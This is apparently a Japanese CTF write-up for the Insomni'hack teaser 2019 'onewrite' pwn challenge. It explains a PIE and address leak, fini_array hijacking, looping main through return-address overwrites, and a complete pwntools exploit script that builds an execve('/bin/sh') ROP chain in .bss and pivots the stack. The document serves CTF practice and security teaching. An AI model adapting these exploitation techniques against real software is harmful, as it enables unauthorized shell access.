# [pwn 87pts] onewrite - Insomni'hack teaser 2019
64ビットバイナリですが、色々と有効になっています。
```
$ checksec onewrite
[!] Did not find any GOT entries
[*] "/home/ptr/writeups/2019/Insomni'hack_teaser_2019/onewrite/onewrite"
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
fileコマンドではdynamically linkedとなっていますが、static linkのようです。

`do_leak`関数はrspの値か`do_leak`関数のアドレスを出力してくれます。
その後`do_overwrite`関数が呼び出され、任意のアドレスに8バイト書き込むことができます。

とりあえず終了時に呼び出される関数があるはずなので、`__libc_csu_fini`を見ましょう。
`__libc_csu_fini`は`__libc_start_main`に`main`関数のアドレスなどと一緒に渡される関数で、次のように定義されています。
```c
void __libc_csu_fini(void)
{
#ifndef LIBC_NONSHARED
  size_t i = __fini_array_end - __fini_array_start;
  while (i-- > 0)
    (*__fini_array_start [i]) ();
# ifndef NO_INITFINI
  _fini ();
# endif
#endif
}
```
IDAで見ると`__fini_array_start`は`__do_global_dtors_aux_fini_array_entry`という名前になっています。
```nasm
lea     rbp, __do_global_dtors_aux_fini_array_entry
...
call    qword ptr [rbp+rbx*8+0]
```
したがって、ここの値を書き換えれば、終了時に任意アドレスが呼び出せそうです。

とりあえずジャンプできることを確認します。
```python
from pwn import *

elf = ELF("./onewrite")
sock = process("./onewrite")

# Overwrite: *fini_array_start = 0xffffffffffffffff
sock.recvuntil(" > ")
sock.sendline("2")
addr = sock.recvline()
addr_do_leak = int(addr, 16)
pie_base = addr_do_leak - elf.symbols['do_leak']
addr_fini_array_start = pie_base + elf.symbols['__do_global_dtors_aux_fini_array_entry']
print("[+] fini_array_start = " + hex(addr_fini_array_start))
sock.recvuntil("address : ")
sock.send(str(addr_fini_array_start))
sock.recvuntil("data : ")
sock.send(p64(0xffffffffffffffff))

sock.interactive()
```
dmesgを見ると、ちゃんと書き込んだアドレスへジャンプされていることが確認できます。
```
[ 4618.182851] onewrite[9515]: segfault at ffffffffffffffff ip ffffffffffffffff sp 00007ffcc6d6afa8 error 15
```
これを使って何度でも`do_overwrite`関数が呼び出せると思ったのですが、一度呼び出すとretで`__libc_csu_fini`へ戻ってしまいます。

do_leak内でのスタックの状態は次のようになっています。
```
0000| 0x7fffffffda80 --> 0x7ffff7d53780 (<__libc_csu_init>:     push   r15)
0008| 0x7fffffffda88 --> 0x7ffff7d52a15 (<do_leak>:     sub    rsp,0x18)
0016| 0x7fffffffda90 --> 0x0 
0024| 0x7fffffffda98 --> 0x7ffff7d52b09 (<main+81>:     nop)
0032| 0x7fffffffdaa0 --> 0x7ffff7d52060 (<_init>:       sub    rsp,0x8)
0040| 0x7fffffffdaa8 --> 0x7ffff7d53089 (<__libc_start_main+777>:       mov    edi,eax)
0048| 0x7fffffffdab0 --> 0x0 
0056| 0x7fffffffdab8 --> 0x100000000 
```
ここで`__libc_start_main`へ戻る`main`関数のリターンアドレスを`main`に書き換えます。
すると、`main`関数終了時にもう一度`main`が呼び出されるわけですが、次に呼び出される`do_leak`内のスタックの状態は次のようになっています。
```
0000| 0x7fffffffda88 --> 0x7ffff7d53780 (<__libc_csu_init>:     push   r15)
0008| 0x7fffffffda90 --> 0x7ffff7d53810 (<__libc_csu_fini>:     push   rbp)
0016| 0x7fffffffda98 --> 0x0 
0024| 0x7fffffffdaa0 --> 0x7ffff7d52b09 (<main+81>:     nop)
0032| 0x7fffffffdaa8 --> 0x7ffff7d52ab8 (<main>:        sub    rsp,0x8)
0040| 0x7fffffffdab0 --> 0xa30 ('0\n')
0048| 0x7fffffffdab8 --> 0x100000000 
0056| 0x7fffffffdac0 --> 0x7fffffffdbc8 --> 0x7fffffffdf6c ("/home/ptr/writeups/2019/Insomni'hack_teaser_2019/onewrite/onewrite")
```
最初に書き換えた`main`のリターンアドレスはそのままで、その次に`do_leak`のリターンアドレスがあります。
したがって、次に`do_leak`のリターンアドレスを`main`にしてやれば、この後2回`main`が呼び出されます。
1回目の`main`で自由なアドレスに値を書き込み、2回目の`main`で再びスタックを書き換えれば何度でも書き込みができます。

これに気付けばあとは簡単です。
bssセクションにROPを組み立てて、最後にstack pivotでrspをそこへ移してやればROPが発動します。
今回はstatic linkなのでROP Gadgetは十分に見付かります。

```python
from pwn import *

elf = ELF("./onewrite")
sock = process("./onewrite")

rop_pop_rax = 0x000460ac
rop_pop_rdi = 0x000084fa
rop_pop_rsi = 0x0000d9f2
rop_pop_rdx = 0x000484c5
rop_pop_rsp = 0x0000946a
rop_syscall = 0x0006e605

def leak(choice):
    # 1: rsp / 2: do_leak
    sock.recvuntil(" > ")
    sock.sendline(str(choice))
    addr = int(sock.recvline(), 16)
    return addr

def overwrite_once(addr, data):
    sock.recvuntil("address : ")
    sock.send(str(addr))
    sock.recvuntil("data : ")
    sock.send(p64(data))
    return 

def overwrite(addr, data):
    # ret addr of main --> main
    rsp = leak(1)
    overwrite_once(rsp + 0x28, addr_main)
    # ret addr of do_leak --> main
    rsp = leak(1)
    overwrite_once(rsp + 0x18, addr_main)
    # can overwrite an arbitrary address
    rsp = leak(1)
    overwrite_once(addr, data)
    # now we are in `main`
    return

# Leak PIE base
addr_do_leak = leak(2)
pie_base = addr_do_leak - elf.symbols['do_leak']
addr_main = pie_base + elf.symbols['main']
addr_fini_array_start = pie_base + elf.symbols['__do_global_dtors_aux_fini_array_entry']
addr_bss = pie_base + elf.bss()
print("[+] pie base = " + hex(pie_base))
print("[+] <main> = " + hex(addr_main))
print("[+] __bss_start = " + hex(addr_bss))
print("[+] fini_array_start = " + hex(addr_fini_array_start))
rop_chain = [
    pie_base + rop_pop_rax, 59, # sys_execve
    pie_base + rop_pop_rdi, addr_bss, # filename
    pie_base + rop_pop_rsi, 0, # argv
    pie_base + rop_pop_rdx, 0, # envp
    pie_base + rop_syscall
]

# Overwrite: *fini_array_start = main
overwrite_once(addr_fini_array_start, addr_main)

# Write '/bin/sh' to .bss section
overwrite(addr_bss, u64("/bin/sh\x00"))
overwrite(addr_bss + 8, u64("\x00" * 8))

# Write ROP chain
for (i, rop) in enumerate(rop_chain):
    overwrite(addr_bss + 8 * (i + 2), rop)

# Stack pivot
rsp1 = leak(1)
overwrite_once(rsp1 + 0x28, addr_main)
rsp2 = leak(1)
overwrite_once(rsp2 + 0x18, addr_main)
rsp3 = leak(1)
overwrite_once(rsp1 + 0x38, addr_bss + 16)
rsp4 = leak(1)
print(hex(rsp1 + 0x38))
print(hex(rsp4 + 0x28))
overwrite_once(rsp4 + 0x28, pie_base + rop_pop_rsp)

sock.interactive()
```

# 感想
`main`と`do_leak`のリターンアドレスを`main`にして2回連続`do_overwrite`するというのはちょっと思い付かないかなー。
全部知っている範囲なのでこの手の問題はさくっと解けるようになっておきたいです。
あと`__libc_csu_fini`を使わないやり方もあります。（参考文献[2]）

# 参考文献
[1] [[Insomni'hack 2019] onewrite writeup](https://go-madhat.github.io/onewrite-writeup/)

[2] [Insomni'hack Teaser 2019-onewrite详细解析](https://www.anquanke.com/post/id/169912)